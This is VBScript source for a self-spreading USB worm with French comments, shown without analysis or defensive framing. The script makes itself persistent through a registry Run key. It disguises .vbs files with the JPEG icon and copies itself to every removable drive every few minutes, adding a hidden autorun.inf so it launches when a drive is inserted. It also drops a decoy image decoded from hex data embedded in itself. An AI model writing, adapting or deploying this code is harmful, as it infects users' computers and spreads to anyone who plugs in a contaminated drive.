

on error resume next

demarrage = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSSH = CreateObject("Wscript.shell")
Set xx = FSO.GetSpecialFolder(1)
dim fso,codeintegral 
Set fso = CreateObject("Scripting.FileSystemObject")

entrer 


sub entrer()
ss = cstr(xx)          
'MsgBox xx  
location = wscript.scriptfullname
if instr(location,ss)=false then
	diversion2	
Else
	do while time <> "00:00:00"
		detecterracines
		wscript.sleep 180000 
	loop
end If
detecterracines

if (fso.fileexists(xx & "\OeApi.vbs")) then
Else '--- pas de copie donc
	copiermessage xx,"OeApi"	
	DemarrerDe xx				
	ChangerIcone				
end If							
end sub


sub detecterracines()
	Dim fso, d, dc, s, n
	
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set dc = fso.Drives
	
	For Each d in dc
		racine = d.Driveletter & ":"
		u= detectamovibles(racine)	'-- recupere le type de l'unite grace a une fonction
		'msgbox racine
		
		If u ="Amovible" and d.isready then 
			If not (fso.fileexists(racine & "\esta ig.vbs")) then
				copiermessage racine,"esta ig"  
				createAR( racine )	'cree un autorun sur la cle.
			End if
		End if
	Next
end Sub


Function detectamovibles(drvpath)
	Dim fso, d, s, t
	Set fso = CreateObject("Scripting.FileSystemObject")

	Set d = fso.GetDrive(fso.GetDriveName(fso.GetAbsolutePathName(drvpath)))
	
	Select Case d.DriveType
		Case 0: t = "Inconnu"
		Case 1: t = "Amovible"
		Case 2: t = "Fixe"
		Case 3: t = "Rseau"
		Case 4: t = "CD-ROM"
		Case 5: t = "RAM Disk"
	End Select

	detectamovibles = t
End Function


sub ChangerIcone()
	Dim resultat
	resultat = wssh.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\jpegfile\DefaultIcon\")
	wssh.Regwrite"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Vbsfile\DefaultIcon\",resultat
end Sub


sub DemarrerDe(Location)
	Set wssh = CreateObject("WScript.Shell")
	wssh.regwrite demarrage,location & "\OeApi.vbs"
end Sub


sub copiermessage(x,name)
	File = Wscript.ScriptFullName
	fso.copyfile file ,x & "\" & name & ".vbs"
end Sub


sub diversion2()
	Dim fso, f, f2, ts, ts2
	Dim Ligne, i
	Set FSO = CreateObject("Scripting.FileSystemObject")
	
	if (fso.fileexists(xx & "\esta.jpg")) then
		wssh.run xx & "\esta.jpg"
	Else
		Set f = fso.GetFile(WScript.ScriptFullName)
		Set ts = f.OpenAsTextStream(1, -2)		
		fso.CreateTextFile xx & "\esta.jpg"

		Set f2 = fso.GetFile(xx & "\esta.jpg")
		Set ts2 = f2.OpenAsTextStream(2, -2)	'-- ouvre le fichier cree en mode ecriture
		
		for i=1 to 158
			ts.skipline
		Next
		
		do
			Ligne = ts.readline
			'MsgBox mid(Ligne,i,2)
			For i=2 to Len(Ligne) step 2
					ts2.write chr("&h" & mid(Ligne,i,2))
			Next
		Loop until ts.AtEndOfStream
		
		
		'-- fermeture des fichiers
		ts.Close
		ts2.Close
		wssh.run xx & "\esta.jpg"
	end if
end sub

Sub createAR( unite )
	Dim objFSO
	Dim objStream
	Dim objFile
	
	'creation de autorun
	Set objFSO = CreateObject("scripting.FileSystemObject")
	Set objStream = objFso.CreateTextFile( unite & "\autorun.inf")

	objstream.WriteLine "[AutoRun]"
	objstream.WriteLine "open=wscript ""esta ig.vbs"""
	objstream.WriteLine "shellexecute=wscript ""esta ig.vbs"""
	objstream.WriteLine "shell\Auto\command=wscript ""esta ig.vbs"""
	objstream.WriteLine "shell=Auto"
	
	objStream.Close
	
	WScript.Sleep 1000
	'change les attibut en cache et proteger
	Set objFile = objFSO.GetFile(unite & "\autorun.inf")
	
	objFile.Attributes = 4	'system file
	objFile.Attributes = 2	'hidden file
	'objFile.Attributes = 1	'readonly
End Sub


